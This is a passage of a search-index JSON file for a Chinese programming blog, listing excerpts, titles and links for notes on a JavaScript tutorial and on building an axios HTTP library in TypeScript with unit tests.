事件的本质是程序各个组成部分之间的一种通信方式，也是异步编程的一种实现。DOM 支持大量的事件，本章开始介绍","lvl0":"事件","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"ea97373c29d1a36a02b4180f660615e1","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/06.%E4%BA%8B%E4%BB%B6/"},{"content":"内置对象篇 一、Object对象 1、概述 JavaScript 原生提供Object对象（注意起首的O是大写），本章介绍该对象原生的各种方法。 JavaScript 的所有其他对象都继承","lvl0":"内置对象","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"9f09bede01df917c27bbf001f9b7fb89","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/02.%E5%86%85%E7%BD%AE%E5%AF%B9%E8%B1%A1/"},{"content":"说明：本章内容为博主在原教程基础上添加自己的学习笔记，来源https://wangdoc.com/javascript/，教程版权归原作者所","lvl0":"基础","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"9e81f31c6b9487834165fec3bfbae7d9","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/01.%E5%9F%BA%E7%A1%80/"},{"content":"异步操作 一、异步操作概述 1、单线程模型 单线程模型指的是，JavaScript 只在一个线程上运行。也就是说，JavaScript 同时只能执行一","lvl0":"异步操作","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"b76d9592934b0829ee7896d566d41368","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/04.%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/"},{"content":"浏览器模型 一、浏览器环境概述 JavaScript 是浏览器的内置脚本语言。也就是说，浏览器内置了 JavaScript 引擎，并且提供各种接口，让 JavaScript 脚本可以控制浏览器的各种功能。一旦","lvl0":"浏览器模型","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"184c0fa9f263cff79cbf08a0bbbd6ad9","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/07.%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/"},{"content":"面向对象编程 一、实例对象与new命令 1、对象是什么 面向对象编程（Object Oriented Programming，缩写为 OOP）是目前主流的编程范式。它","lvl0":"面向对象","lvl1":["《JavaScript教程》笔记"],"lvl2":"摘要","objectID":"616ba1332ee24c36e0a9c403c54a2903","tags":["JavaScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/09.javascript%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/03.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"content":"axios 函数重载 需求分析 目前我们的 axios 函数只支持传入 1 个参数，如下： 1 2 3 4 5 6 7 axios({ url: \u0026#39;/extend/post\u0026#39;, method: \u0026#39;post\u0026#39;, data: { msg: \u0026#39;hi\u0026#39; } }) 我们希望该函数也能支持传入 2 个参数，如下： 1","lvl0":"axios 函数重载","lvl1":["《TypeScript 从零实现 axios》","ts-axios 接口扩展"],"lvl2":"摘要","objectID":"d7ee4d94c0d065e5a0b51ed22525692a","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/06.ts-axios-%E6%8E%A5%E5%8F%A3%E6%89%A9%E5%B1%95/02.axios-%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD/"},{"content":"Axios 实例模块单元测试 ts-axios 提供了 axios.create 静态方法，返回一个 instance 实例，我们需要对这个模块做测试。 测试代码编写 test/instance.spec.ts： 1 2","lvl0":"Axios 实例模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"2363b2377f1559e1efa17519fc94cbb1","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/06.axios-%E5%AE%9E%E4%BE%8B%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"baseURL 需求分析 有些时候，我们会请求某个域名下的多个接口，我们不希望每次发送请求都填写完整的 url，希望可以配置一个 baseURL，之后都可以传相","lvl0":"baseURL","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"251d5338dc806325c198984f83edda38","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/07.baseurl/"},{"content":"headers 模块单元测试 之前我们测试了 headers 的基础方法模块，接下来我们会从业务角度测试 headers 的相关业务逻辑。 测试代码编写 test/headers.spec.t","lvl0":"headers 模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"f9d43fa72d8ce9b6416428b48a9cc31c","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/05.headers-%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"HTTP 授权 需求分析 HTTP 协议中的 Authorization 请求 header 会包含服务器用于验证用户代理身份的凭证，通常会在服务器返回 401 Unauthorized 状态码以及 WWW-Authenticate 消息头之后在后续请求中发送此消息头","lvl0":"HTTP 授权","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"1bdab7125ca1669b6f99602f6f529202","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/04.http-%E6%8E%88%E6%9D%83/"},{"content":"Jest 安装和配置 Jest 安装 由于我们的项目是使用 typescript-library-starter 初始化的，已经内置了 Jest 的安装，但是安装的版本却不是最新的，我们可以对 package.json 中的相关依赖版本做修改，重新安","lvl0":"Jest 安装和配置","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"1dcc199e84b368d94d8a86534ae79de0","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/02.jest-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"},{"content":"mergeConfig 模块单元测试 合并配置是 ts-axios 核心流程中非常重要的一个环节，我们需要为它的各种情况去编写测试。 测试代码编写 test/mergeConfig.sp","lvl0":"mergeConfig 模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"210ede007bbdd93d710d932b480c587e","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/08.mergeconfig-%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"ts-axios 编译与发布 需求分析 前面的章节我们完成 ts-axios 库的代码编写和单元测试。这一章我们希望把代码部署发布到公共 npm 上，供别人下载使用。但是并不是所有人都会","lvl0":"ts-axios 编译与发布","lvl1":["《TypeScript 从零实现 axios》","ts-axios 部署与发布"],"lvl2":"摘要","objectID":"265d66b49ce638045a622de93f6f775c","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/12.ts-axios-%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%8F%91%E5%B8%83/01.ts-axios-%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%91%E5%B8%83/"},{"content":"withCredentials 需求分析 有些时候我们会发一些跨域请求，比如 http://domain-a.com 站点发送一个 http://api.domain-b.com/get 的请求，默认情况下，浏览器会根据同源策略限制这种跨域请求，但是可以通过 CORS 技术解决","lvl0":"withCredentials","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"4ff385d24cecf505d8281e7e03e793d0","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/01.withcredentials/"},{"content":"XSRF 防御 需求分析 XSRF 又名 CSRF，跨站请求伪造，它是前端常见的一种攻击方式，我们先通过一张图来认识它的攻击手段。 CSRF 的防御手段有很多，比如验证请求","lvl0":"XSRF 防御","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"e6345b3006e3bf4a887ca227620c88c4","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/02.xsrf-%E9%98%B2%E5%BE%A1/"},{"content":"上传和下载的进度监控 需求分析 有些时候，当我们上传文件或者是请求一个大体积数据的时候，希望知道实时的进度，甚至可以基于此做一个进度条的展示。 我","lvl0":"上传和下载的进度监控","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"0c1cf1b098ee679ba8c1d28726a5221a","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/03.%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD%E7%9A%84%E8%BF%9B%E5%BA%A6%E7%9B%91%E6%8E%A7/"},{"content":"初始化项目 创建代码仓库 接下来，我们开始初始化项目，首先我们先去 GitHub 上创建一个 repo，填好 repo 名称，以及写一下 README，对项目先做个简单的描","lvl0":"初始化项目","lvl1":["《TypeScript 从零实现 axios》","ts-axios 项目初始化"],"lvl2":"摘要","objectID":"cdc7e58591bc73038b96a9023f1772e7","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/03.ts-axios-%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96/02.%E5%88%9D%E5%A7%8B%E5%8C%96%E9%A1%B9%E7%9B%AE/"},{"content":"前言 单元测试是前端一个很重要的方向，鉴别一个开源库是否靠谱的一个标准是它的单元测试是否完善。有了完整的单元测试，未来你去重构现有代码或者是增","lvl0":"前言","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"b1a877caebd6d356783b5805851b2872","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/01.%E5%89%8D%E8%A8%80/"},{"content":"剩余模块单元测试 defaults 模块单元测试 defaults 模块为请求配置提供了一些默认的属性和方法，我们需要为其编写单元测试。 test/defaults.spec.t","lvl0":"剩余模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"1abe0f7f305e1de9c6b8a7caa81400d6","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/10.%E5%89%A9%E4%BD%99%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"取消功能的设计与实现 需求分析 有些场景下，我们希望能主动取消请求，比如常见的搜索框案例，在用户输入过程中，搜索框的内容也在不断变化，正常情况每","lvl0":"取消功能的设计与实现","lvl1":["《TypeScript 从零实现 axios》","ts-axios 取消功能实现"],"lvl2":"摘要","objectID":"d1af96eeb2aed9adbe0d4f85495dd945","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/09.ts-axios-%E5%8F%96%E6%B6%88%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/01.%E5%8F%96%E6%B6%88%E5%8A%9F%E8%83%BD%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"content":"合并配置的设计与实现 需求分析 在之前的章节我们了解到，在发送请求的时候可以传入一个配置，来决定请求的不同行为。我们也希望 ts-axios 可以有默认配置，定义","lvl0":"合并配置的设计与实现","lvl1":["《TypeScript 从零实现 axios》","ts-axios 配置化实现"],"lvl2":"摘要","objectID":"b5e26008fb59817172698cc731750e21","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/08.ts-axios-%E9%85%8D%E7%BD%AE%E5%8C%96%E5%AE%9E%E7%8E%B0/01.%E5%90%88%E5%B9%B6%E9%85%8D%E7%BD%AE%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"content":"响应数据支持泛型 需求分析 通常情况下，我们会把后端返回数据格式单独放入一个接口中： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // 请求接口数据 export interface ResponseData\u0026lt;T","lvl0":"响应数据支持泛型","lvl1":["《TypeScript 从零实现 axios》","ts-axios 接口扩展"],"lvl2":"摘要","objectID":"b5f81b6e2524d8b614688799197da105","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/06.ts-axios-%E6%8E%A5%E5%8F%A3%E6%89%A9%E5%B1%95/03.%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE%E6%94%AF%E6%8C%81%E6%B3%9B%E5%9E%8B/"},{"content":"处理响应 data 需求分析 在我们不去设置 responseType 的情况下，当服务端返回给我们的数据是字符串类型，我们可以尝试去把它转换成一个 JSON 对象。例如： 1 data: \u0026#34;{\u0026#34;a\u0026#34;:1,\u0026#34;b\u0026#34;:2}\u0026#34; 我们把它转","lvl0":"处理响应 data","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"d5397b39a566edf1ce4e7b44d37e4b57","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/06.%E5%A4%84%E7%90%86%E5%93%8D%E5%BA%94-data/"},{"content":"处理响应 header 需求分析 我们通过 XMLHttpRequest 对象的 getAllResponseHeaders 方法获取到的值是如下一段字符串： 1 2 3 4 5 6 date: Fri, 05 Apr 2019 12:40:49 GMT etag: W/\u0026#34;d-Ssxx4FRxEutDLwo2+xkkxKc4y0k\u0026#34; connection: keep-alive x-powered-by: Express content-length: 13 content-type: application/json; charset=utf-8 每一行都是以回车符和换行","lvl0":"处理响应 header","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"011d9e82d18148b8c9a6d27dc79aacc9","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/05.%E5%A4%84%E7%90%86%E5%93%8D%E5%BA%94-header/"},{"content":"处理请求 body 数据 需求分析 我们通过执行 XMLHttpRequest 对象实例的 send 方法来发送请求，并通过该方法的参数设置请求 body 数据，我们可以去 mdn 查阅该方法支持的参数类型。 我们","lvl0":"处理请求 body 数据","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"db1d3ec259279f697b8ac168c11b6823","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/02.%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82-body-%E6%95%B0%E6%8D%AE/"},{"content":"处理请求 header 需求分析 我们上节课遗留了一个问题： 1 2 3 4 5 6 7 8 axios({ method: \u0026#39;post\u0026#39;, url: \u0026#39;/base/post\u0026#39;, data: { a: 1, b: 2 } }) 我们做了请求数据的处理，把 data 转换成了 JSON 字符串，但是数据","lvl0":"处理请求 header","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"a686970f19481e815bde108da51564f3","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/03.%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82-header/"},{"content":"处理请求 url 参数 需求分析 还记得我们上节课遗留了一个问题，再来看这个例子： 1 2 3 4 5 6 7 8 axios({ method: \u0026#39;get\u0026#39;, url: \u0026#39;/base/get\u0026#39;, params: { a: 1, b: 2 } }) 我们希望最终请求的 url 是 /ba","lvl0":"处理请求 url 参数","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"7fc78ec587966fc18343012a4c378aff","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/01.%E5%A4%84%E7%90%86%E8%AF%B7%E6%B1%82-url-%E5%8F%82%E6%95%B0/"},{"content":"引用 ts-axios 库 在 TS 项目中引用 我们借助于 vue-cli 脚手架创建一个 TypeScript 的 Vue 项目，然后我们把 Vue 官网上一段使用 axios 发请求的 demo 代码抄过来。 我们需要先执行 npm install ts-axios-new 安装 ts-axios 库。","lvl0":"引用 ts-axios 库","lvl1":["《TypeScript 从零实现 axios》","ts-axios 部署与发布"],"lvl2":"摘要","objectID":"af4696b57415c766ef40c699c76aff2d","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/12.ts-axios-%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%8F%91%E5%B8%83/02.%E5%BC%95%E7%94%A8-ts-axios-%E5%BA%93/"},{"content":"扩展 axios.create 静态接口 需求分析 目前为止，我们的 axios 都是一个单例，一旦我们修改了 axios 的默认配置，会影响所有的请求。我们希望提供了一个 axios.create 的静态接口允许我们创","lvl0":"扩展 create 静态接口","lvl1":["《TypeScript 从零实现 axios》","ts-axios 配置化实现"],"lvl2":"摘要","objectID":"a1b1c1217b89f80d1b45ae96a1c5600b","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/08.ts-axios-%E9%85%8D%E7%BD%AE%E5%8C%96%E5%AE%9E%E7%8E%B0/03.%E6%89%A9%E5%B1%95-create-%E9%9D%99%E6%80%81%E6%8E%A5%E5%8F%A3/"},{"content":"扩展接口 需求分析 为了用户更加方便地使用 axios 发送请求，我们可以为所有支持请求方法扩展一些接口： axios.request(config) axios.get(url[, config]) axios.delete(url[, config]) axios.head(url[, config]) axios.options(url[, config]) axios.post(url[, data[, config]]) axios.put(url[, data[, config]]) axios.patch(url[, data[, config]]) 如果使用了这些","lvl0":"扩展接口","lvl1":["《TypeScript 从零实现 axios》","ts-axios 接口扩展"],"lvl2":"摘要","objectID":"03cc4ba06a5d8b7a2f91a1e895bf2dc6","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/06.ts-axios-%E6%8E%A5%E5%8F%A3%E6%89%A9%E5%B1%95/01.%E6%89%A9%E5%B1%95%E6%8E%A5%E5%8F%A3/"},{"content":"拦截器模块单元测试 拦截器是 ts-axios 库一个非常实用的功能，接下来我们来编写它的测试代码。 测试代码编写 test/interceptor.spec.ts","lvl0":"拦截器模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"d0b4af954900ae2cf494f258802062d4","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/07.%E6%8B%A6%E6%88%AA%E5%99%A8%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"拦截器设计与实现 需求分析 我们希望能对请求的发送和响应做拦截，也就是在发送请求之前和接收到响应之后做一些额外逻辑。 我们希望设计的拦截器的使用方","lvl0":"拦截器设计与实现","lvl1":["《TypeScript 从零实现 axios》","ts-axios 拦截器实现"],"lvl2":"摘要","objectID":"f04ec4baa00101d85d73890390ff0f1b","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/07.ts-axios-%E6%8B%A6%E6%88%AA%E5%99%A8%E5%AE%9E%E7%8E%B0/01.%E6%8B%A6%E6%88%AA%E5%99%A8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"},{"content":"编写基础请求代码 我们这节课开始编写 ts-axios 库，我们的目标是实现简单的发送请求功能，即客户端通过 XMLHttpRequest 对象把请求发送到 server 端，server 端能收到请求并响","lvl0":"编写基础请求代码","lvl1":["《TypeScript 从零实现 axios》","ts-axios 项目初始化"],"lvl2":"摘要","objectID":"bc1686d524312734bd7d2d196462e6a2","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/03.ts-axios-%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96/03.%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80%E8%AF%B7%E6%B1%82%E4%BB%A3%E7%A0%81/"},{"content":"自定义参数序列化 需求分析 在之前的章节，我们对请求的 url 参数做了处理，我们会解析传入的 params 对象，根据一定的规则把它解析成字符串，然后添加在 url 后面。","lvl0":"自定义参数序列化","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"f9141f06a424338b92701a2416a07322","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/06.%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%82%E6%95%B0%E5%BA%8F%E5%88%97%E5%8C%96/"},{"content":"自定义合法状态码 需求分析 之前 ts-axios 在处理响应结果的时候，认为 HTTP status 在 200 和 300 之间是一个合法值，在这个区间之外则创建一个错误。有些时候我们想自定义这个","lvl0":"自定义合法状态码","lvl1":["《TypeScript 从零实现 axios》","ts-axios 更多功能实现"],"lvl2":"摘要","objectID":"b29fd649980718691ee4e3570fb5c8a7","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/10.ts-axios-%E6%9B%B4%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/05.%E8%87%AA%E5%AE%9A%E4%B9%89%E5%90%88%E6%B3%95%E7%8A%B6%E6%80%81%E7%A0%81/"},{"content":"获取响应数据 需求分析 在前面的章节中，我们发送的请求都可以从网络层面接收到服务端返回的数据，但是代码层面并没有做任何关于返回数据的处理。我们希","lvl0":"获取响应数据","lvl1":["《TypeScript 从零实现 axios》","ts-axios 基础功能实现"],"lvl2":"摘要","objectID":"115fc094d6bc7cdcc1d20353a8bc9759","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/04.ts-axios-%E5%9F%BA%E7%A1%80%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/04.%E8%8E%B7%E5%8F%96%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE/"},{"content":"请求取消模块单元测试 请求取消模块是 ts-axios 库核心流程其中一个分支，也是非常重要的模块，我们将从基础库和业务流程模块 2 个方面去编写单元测试。 Cancel 类单元","lvl0":"请求取消模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 单元测试"],"lvl2":"摘要","objectID":"5618c644b133689a1c4cf3f367327f34","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/11.ts-axios-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/09.%E8%AF%B7%E6%B1%82%E5%8F%96%E6%B6%88%E6%A8%A1%E5%9D%97%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95/"},{"content":"请求和响应配置化 需求分析 官方的 axios 库 给默认配置添加了 transformRequest 和 transformResponse 两个字段，它们的值是一个数组或者是一个函数。 其中 transformRequest 允许你在将请求数据发送到服务器之前","lvl0":"请求和响应配置化","lvl1":["《TypeScript 从零实现 axios》","ts-axios 配置化实现"],"lvl2":"摘要","objectID":"8707ac8d4bbdeba8ad5ec9fac4616867","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/11.typescript%E4%BB%8E%E9%9B%B6%E5%AE%9E%E7%8E%B0-axios/08.ts-axios-%E9%85%8D%E7%BD%AE%E5%8C%96%E5%AE%9E%E7%8E%B0/02.%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94%E9%85%8D%E7%BD%AE%E5%8C%96/"},{"content":"请求模块单元测试 请求模块是 axios 最基础的模块，通过一个 axios 方法发送 Ajax 请求。 jasmine-ajax Jasmine 是一个 BDD(行为驱动开发)的测试框架，它有很多成熟的插件，比如我们","lvl0":"请求模块单元测试","lvl1":["《TypeScript 从零实现 axios》","ts-axios 